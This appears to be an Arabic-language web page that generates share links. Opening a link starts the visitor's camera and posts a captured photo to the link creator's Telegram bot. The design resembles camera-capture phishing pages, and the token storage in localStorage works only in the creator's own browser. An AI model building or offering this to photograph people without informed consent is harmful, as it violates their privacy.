<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مشارك الصور</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 20px;
      color: #333;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1, h2 {
      text-align: center;
      color: #4a89dc;
    }
    .input-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-sizing: border-box;
    }
    button {
      background-color: #4a89dc;
      color: white;
      border: none;
      padding: 10px 15px;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
    }
    button:hover {
      background-color: #3a70b0;
    }
    #linkContainer {
      margin-top: 20px;
      display: none;
    }
    #shareLink {
      padding: 10px;
      background-color: #f9f9f9;
      border: 1px dashed #4a89dc;
      border-radius: 5px;
      word-break: break-all;
    }
    #cameraContainer {
      display: none;
      text-align: center;
    }
    #video, #canvas {
      width: 100%;
      max-width: 500px;
      border-radius: 5px;
      border: 1px solid #ddd;
    }
    .capture-btn {
      margin: 15px 0;
    }
    #resultImage {
      max-width: 100%;
      display: none;
      margin-top: 15px;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <h1>مولّد رابط مشاركة الصور</h1>
    
    <div class="input-group">
      <label for="tokenInput">توكن البوت:</label>
      <input type="text" id="tokenInput" placeholder="أدخل توكن البوت الخاص بك">
    </div>

    <div class="input-group">
      <label for="chatIdInput">Chat ID:</label>
      <input type="text" id="chatIdInput" placeholder="أدخل رقم الـ chat_id الخاص بك">
    </div>
    
    <button id="generateBtn">إنشاء رابط المشاركة</button>
    
    <div id="linkContainer">
      <h3>رابط المشاركة:</h3>
      <div id="shareLink"></div>
      <button id="copyBtn" style="margin-top: 10px;">نسخ الرابط</button>
    </div>
  </div>

  <div class="container" id="cameraContainer">
    <h2>التقاط صورة</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="captureBtn" class="capture-btn">📸 التقاط صورة</button>
    <img id="resultImage" alt="الصورة الملتقطة">
    <div id="uploadStatus" style="margin-top: 15px;"></div>
  </div>

  <script>
    const mainContainer = document.getElementById('mainContainer');
    const cameraContainer = document.getElementById('cameraContainer');
    const tokenInput = document.getElementById('tokenInput');
    const chatIdInput = document.getElementById('chatIdInput');
    const generateBtn = document.getElementById('generateBtn');
    const linkContainer = document.getElementById('linkContainer');
    const shareLink = document.getElementById('shareLink');
    const copyBtn = document.getElementById('copyBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');
    const resultImage = document.getElementById('resultImage');
    const uploadStatus = document.getElementById('uploadStatus');

    const urlParams = new URLSearchParams(window.location.search);
    const shareId = urlParams.get('id');

    // لو حد فتح الرابط المخصص
    if (shareId) {
      mainContainer.style.display = 'none';
      cameraContainer.style.display = 'block';
      initCamera();
    }

    function initCamera() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(function(stream) {
        video.srcObject = stream;
      })
      .catch(function(err) {
        uploadStatus.textContent = 'خطأ في الوصول إلى الكاميرا: ' + err.message;
        uploadStatus.style.color = 'red';
      });
    }

    captureBtn.addEventListener('click', function() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      
      resultImage.src = canvas.toDataURL('image/png');
      resultImage.style.display = 'block';
      captureBtn.style.display = 'none';
      
      sendImage();
    });

    function sendImage() {
      uploadStatus.textContent = 'جاري إرسال الصورة...';
      uploadStatus.style.color = 'blue';

      const storedData = localStorage.getItem(`share_${shareId}`);
      if (!storedData) {
        uploadStatus.textContent = '❌ بيانات التوكن/الـchat_id غير موجودة.';
        uploadStatus.style.color = 'red';
        return;
      }

      const { token, chatId } = JSON.parse(storedData);

      canvas.toBlob(function(blob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'image.png');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            uploadStatus.textContent = '✅ تم إرسال الصورة بنجاح';
            uploadStatus.style.color = 'green';
          } else {
            uploadStatus.textContent = '❌ خطأ من تيليجرام: ' + data.description;
            uploadStatus.style.color = 'red';
          }
        })
        .catch(error => {
          uploadStatus.textContent = '❌ خطأ في الإرسال: ' + error.message;
          uploadStatus.style.color = 'red';
        });
      }, 'image/png');
    }

    generateBtn.addEventListener('click', function() {
      const token = tokenInput.value.trim();
      const chatId = chatIdInput.value.trim();
      
      if (!token || !chatId) {
        alert('يرجى إدخال التوكن والـchat_id');
        return;
      }
      
      const uniqueId = generateUniqueId();
      const link = `${window.location.origin}${window.location.pathname}?id=${uniqueId}`;
      
      localStorage.setItem(`share_${uniqueId}`, JSON.stringify({ token, chatId }));
      
      shareLink.textContent = link;
      linkContainer.style.display = 'block';
    });

    copyBtn.addEventListener('click', function() {
      const tempTextArea = document.createElement('textarea');
      tempTextArea.value = shareLink.textContent;
      document.body.appendChild(tempTextArea);
      tempTextArea.select();
      document.execCommand('copy');
      document.body.removeChild(tempTextArea);
      alert('تم نسخ الرابط!');
    });

    function generateUniqueId() {
      return Math.random().toString(36).substring(2) + Date.now().toString(36);
    }
  </script>
</body>
</html>
